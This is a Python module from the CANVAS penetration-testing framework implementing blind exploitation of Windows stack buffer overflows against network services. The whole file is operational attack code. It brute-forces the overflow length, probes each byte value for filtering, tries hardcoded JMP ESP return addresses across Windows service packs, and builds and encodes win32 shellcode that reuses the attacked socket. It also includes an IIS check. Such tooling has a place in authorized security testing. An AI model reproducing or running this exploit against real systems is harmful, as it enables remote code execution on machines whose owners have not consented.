#! /usr/bin/env python

"""
blindStack.py

CANVAS License, Immunity, Inc.

Exploit win32 stack overflows blindly for the rare case that you think there is a
stack overflow but you can't get the binary

You'll want to subclass this class, but it does all the payload generation for you

Word to Wirepair.

Debugging this is going to mean hitting control-s and control-q from the terminal window, and
attaching to the process to see how far along you've gotten.

"""
import time
from exploitutils import *
from tcpexploit import tcpexploit
from MOSDEF import mosdef 
import canvasengine
from shellcode import shellcodeGenerator
from encoder import chunkedaddencoder


class blindStack(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.saveconnection=1
        self.startcrash=0
        self.toprange=5000
        self.crashed=0
        self.order=intel_order
        self.subesp=2000
        #list of all the jmp esps for all service packs
        #SP4 is done, except for edx,esp
        #we want JMP here and not CALL. CALL is going to corrupt the stack.
        self.eipaddrs=[0x6d701340L, 0x77f82a65L, 0x77f92a9bL, 0x77f8cf83L, 0x77f950cbL, 0x77fad4e3L, 0x74fdee63L, 0x7517ece2L] 


        self.defaultfingerprints=[]
        self.nobrute=0
        self.newnode=None #holder for our new node when we need it
        
        return
    
        
    def checkbadstring(self,buffer):
        for c in self.badstring:
            if c in buffer:
                return 1
        return 0
        
    def tryfingerprint(self,fingerprint):
        safeaddrnum=fingerprint["safeaddrnum"]
        size=fingerprint["size"]
        eipaddr=fingerprint["eipaddr"]
        #we need to check if safeaddr is in badstring
        
        payload="X"*(size-4) #-4 for the one hardcoded safeaddr
        safeaddr=0x7ffd02eb #oooh, tricky safe address that nops  :>
        safeaddr2=0x7ffd06eb #oooh, tricky safe address that nops  :>
        payload+=self.order(safeaddr)*safeaddrnum
        payload+=self.order(safeaddr2)*1 #this one always exists...we need it for the jmp over our eip
        payload+=self.order(eipaddr)
        payload+=self.order(safeaddr)*4 #some pad space
        payload+="A"*6 #inc eax * 6 as a nop
        totallength=len(payload)
        
        #this little loop is to try to avoid bad characters
        for i in range(0,50):
            jmpbackcode=mosdef.assemble("jmp $-%d\n"%(totallength-i+5),"X86")
            if not self.checkbadstring(jmpbackcode):
                break
            
        if (len(self.shellcode)+i>=(totallength-24)) or i==50:
            self.log("Was not able to do jmpbackcode - appending shellcode")
            payload+=self.shellcode
        else:
            self.log("Found jmpback value of %d"%i)
            payload=stroverwrite(payload,self.shellcode,i)
            payload=payload+jmpbackcode
            
        #payload+=self.shellcode #hope you got the filter string correct. :>
        self.log("safeaddrnum=%d size=%d eipaddr=%8.8x"%(safeaddrnum,size,eipaddr))
        self.log("Badstring=%s"%prettyprint(self.badstring))
        self.sendpayload(payload)
        ret=self.lookforsuccess()
        return ret
    
    def run(self):
        
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.ssl=int(self.argsDict.get("ssl",self.ssl))

        self.setInfo("%s attacking %s:%d (in progress)"%(self.name,self.host,self.port))

        self.log("Trying %d default fingerprints"%len(self.defaultfingerprints))
        if len(self.defaultfingerprints)>0:
            for f in self.defaultfingerprints:
                if self.state==self.HALT:
                    return 0
                ret=self.tryfingerprint(f)
                if ret!=0:
                    return ret
            
            self.log("Done with default fingerprints - sleeping for 3 seconds")
            time.sleep(3)
        else:
            self.log("No default fingerprints - just doing brute force...")

        if self.nobrute:
            self.log("Not brute forcing...")
            return 0
        
        crashlength=self.find_crash_length()
        if crashlength==1:
            self.log("Some sort of error - 1 can't be right!")
            return 0
        
        if crashlength==-1:
            self.log("Failed to crash!")
            return 0

        if self.state==self.HALT:
            return 0
                
        badchars=self.filter_detection(crashlength)
        self.log("Badchars detected: %s"%hexprint(badchars))
        if badchars!=self.badstring:
            self.badstring=badchars
            self.log("Recreating shellcode...")
            self.createShellcode()
        
        #our crashlength may be stomping on the second or third byte of a 
        #word, or the lower endian byte may have been enough...
        #and don't forget there may be an added null
        #hence, we have to play some alignment games all throughout

        #as wirepair notes in his paper, for /gS protected dll's you can actually
        #optimize finding the SEH offset by waiting for it to crash on you, calculating
        #the distance, and directly owning the SEH. We brute force it here, which 
        #is less optimal, but should still work.
        
        for alignment in range(-3,4): #we overcompensate for weirdness here
            #two options:
            # 1. We stomped some variable but not eip (ebp, for example)
            # 2. We stomped a bit of eip (and our alignment will adjust to make sure
            #    we got all of it.
            # note: int * a,*b; will crash even if we replace a and b, due to eip being munged
            # by zero. This means if eip is followed by a safeaddr, we fail. We could
            #try to fix this with N safe addrs after the eip location, but, damnit, whatever.
            size=crashlength-1+alignment
            for i in xrange(0,200):
                for eipaddr in self.eipaddrs:
                    #we do up to 20 safe addrs and one eip addr
                    fingerprint={}
                    fingerprint["safeaddrnum"]=i
                    fingerprint["size"]=size
                    fingerprint["eipaddr"]=eipaddr
                    self.log("In alignment: %d"%alignment)
                    ret=self.tryfingerprint(fingerprint)
                    if ret:
                        self.log("Badchars detected: %s"%hexprint(self.badstring))
                        self.log("We win! fingerprint=%s"%str(fingerprint))
                        return ret
                    if self.state==self.HALT:
                        return 0
        self.log("Badchars detected: %s"%hexprint(self.badstring))
        self.log("Failed to find proper magic string.")
        return 0
        
    def find_crash_length(self):
        """
        We gradually increase the length of our string until it crashes. This
        doesn't mean it found ebp/eip, just that it overwrote SOMETHING.
        
        Other issues are that there may be some dwords that need to be "valid"
        within our overwritten data. We try to optimize this search across a basically
        exponential space. Hmm. No we dont. We handle this later.
        """
        
        #we can't do binary search properly here for various reasons I don't feel
        #like explaining
        
        for i in xrange(self.startcrash,self.toprange):
            self.log("find_crash_length: trying %d"%i)
            payload="X"*i
            ret=self.sendpayload(payload)
            if ret==0:
                #could not connect!
                return -1
            if self.crashed:
                return i
            if self.state==self.HALT:
                return 0
        return -1 #failed to crash
    
    def filter_detection(self,size):
        "returns a list of bad characters"
        badchars=""
        for badchar in range(0,256):
            self.log("Testing %2.2x as a badchar with length %d"%(badchar,size))
            self.log("Current badchars=%s"%prettyprint(badchars))
            payload=chr(badchar)*size
            self.sendpayload(payload)
            if not self.crashed:
                badchars+=chr(badchar)
            #now we test for encoding - if we encode a < into \< for example, length will be double, and it will still crash...
            payload=chr(badchar)*(size/2)
            self.sendpayload(payload)
            if self.crashed:
                badchars+=chr(badchar)
            if self.state==self.HALT:
                return badchars
        return badchars
    
    def reset_crash(self):
        self.crashed=0
    
    def test(self):

        self.host=self.target.interface
        self.port=self.argsDict.get("port",self.port)
        self.ssl=self.argsDict.get("ssl",self.ssl)

        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s=self.gettcpsock()
        try:
            s.connect((self.host, self.port))
        except:
            self.log("Could not connect to port 80")
            return 0
        
        self.websend(s,"HEAD %s%s HTTP/1.0\r\n\r\n"%(self.directory,self.filename))
        data=self.webrecv(s)
        if data.count("IIS") and data.count("200"):
            self.version=1 #BAD, but we don't fingerprint IIS Service Packs yet
            return 1
        return 0
    
    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #name, jmp esp, writeloc, writable, shelloc
        #0 is automatic. Need to import that IIS fingerprinter...
        self.versions[1]=("Windows (any)",None)
    
    def createShellcode(self):
        #localhost=self.callback.ip
        #localport=self.callback.port

        sc = shellcodeGenerator.win32()
        #sc.addAttr("ForkLoad", None)
        # the to fork code
        sc.addAttr("findeipnoesp",{"subespval": self.subesp}) #don't mess with eip
        sc.addAttr("isapiGOFindSock",None)
        sc.addAttr("ExitThread",None)
        #set up the shellcode
        self.shellcode=sc.get()
        self.log("Size of raw shellcode is %d"%len(self.shellcode))

        encoder=chunkedaddencoder.intelchunkedaddencoder()
        #these are the characters not allowed by the exploit
        encoder.setbadstring(self.badstring)

        self.log( "Encoding shellcode. This may take a while if we don't find a good value in the cache.")
        shellcode=encoder.encode(self.shellcode)
        self.log( "Done encoding shellcode.")
        if shellcode=="":
            self.log( "Could not encode shellcode")
            return 0
        #debug int
        #shellcode="\xcc"+shellcode        
        self.setShellcode(shellcode)
        self.log("Size of encoded shellcode is %d"%len(self.shellcode))

        return 1
    
    
    def lookforsuccess(self):
        if self.ISucceeded():
            if self.newnode:
                return self.newnode
            
            return 1
        return 0
